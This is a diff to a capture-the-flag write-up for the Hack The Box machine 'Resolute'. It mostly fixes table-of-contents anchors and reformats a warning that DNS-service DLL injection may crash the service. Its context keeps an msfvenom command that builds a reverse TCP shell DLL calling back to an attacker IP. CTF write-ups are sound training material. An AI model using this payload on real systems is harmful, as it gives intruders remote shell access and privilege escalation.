@@ -6,17 +6,17 @@
 
 ### Summary
 
-2- [Enumeration](https://github.com/flast101/HTB-writeups/tree/master/resolute#enumeration)   
-2.1- [nmap scan](https://github.com/flast101/HTB-writeups/tree/master/resolute#nmap-scan)   
-2.2- [Active Directory Enumeration](https://github.com/flast101/HTB-writeups/tree/master/resolute#active-directory-enumeration)   
+2- [Enumeration](https://github.com/flast101/HTB-writeups/tree/master/resolute#2--enumeration)   
+2.1- [nmap scan](https://github.com/flast101/HTB-writeups/tree/master/resolute#21--nmap-scan)   
+2.2- [Active Directory Enumeration](https://github.com/flast101/HTB-writeups/tree/master/resolute#22--active-directory-enumeration)   
 
-3- [Exploitation](https://github.com/flast101/HTB-writeups/tree/master/resolute#exploitation)   
-3.1- [Bruteforcing Credentials](https://github.com/flast101/HTB-writeups/tree/master/resolute#bruteforcing-credentials)   
-3.2- [Getting user.txt](https://github.com/flast101/HTB-writeups/tree/master/resolute#getting-usertxt)   
+3- [Exploitation](https://github.com/flast101/HTB-writeups/tree/master/resolute#3--exploitation)   
+3.1- [Bruteforcing Credentials](https://github.com/flast101/HTB-writeups/tree/master/resolute#31--bruteforcing-credentials)   
+3.2- [Getting user.txt](https://github.com/flast101/HTB-writeups/tree/master/resolute#32--getting-usertxt)   
 
-4- [Privilege Escalation](https://github.com/flast101/HTB-writeups/tree/master/resolute#privilege-escalation)   
-4.1- [Post-Compromise Enumeration](https://github.com/flast101/HTB-writeups/tree/master/resolute#post-compromise-enumeration)   
-4.2- [New Account Enumeration](https://github.com/flast101/HTB-writeups/tree/master/resolute#new-account-enumeration)  
+4- [Privilege Escalation](https://github.com/flast101/HTB-writeups/tree/master/resolute#4--privilege-escalation)   
+4.1- [Post-Compromise Enumeration](https://github.com/flast101/HTB-writeups/tree/master/resolute#41--post-compromise-enumeration)   
+4.2- [New Account Enumeration](https://github.com/flast101/HTB-writeups/tree/master/resolute#42--new-account-enumeration)  
 4.3- [Post-Compromise Exploitation](https://github.com/flast101/HTB-writeups/tree/master/resolute#43--post-compromise-exploitation)
 
 ## 2- Enumeration
@@ -362,12 +362,12 @@ Now, the plan is :
 
 
 #### Warning
-<span style="color:red">Executing this plan will probably crash the DNS service: </span>using DLLs that do not conform to the plugin requirements is not stealthy and this type of activity probably will get picked up by defenders really quickly unless you can restore the DNS service immediately.
+Executing this plan **will probably crash the DNS service:** using DLLs that do not conform to the plugin requirements is not stealthy and this type of activity probably will get picked up by defenders really quickly unless you can restore the DNS service immediately.
 Of course, doing this in a CTF is fine, but think twice before doing anything in a real life assessment. Your customer might become stealthy when it comes to pay you, at least stealthier than you when exploiting his network.
 [IppSec](https://www.hackthebox.eu/home/users/profile/3769) explains very well everything about the exploit and how to do to not crash the server [here](https://www.youtube.com/watch?v=8KJebvmd1Fk&t=3183s).
 
 #### The payload
-A classic reverse tcp shell will work fine:
+A classic reverse tcp shell will works fine:
 ~~~
 root@kali:~# msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.23 LPORT=1234 --platform=windows -f dll > plugin.dll
 ~~~
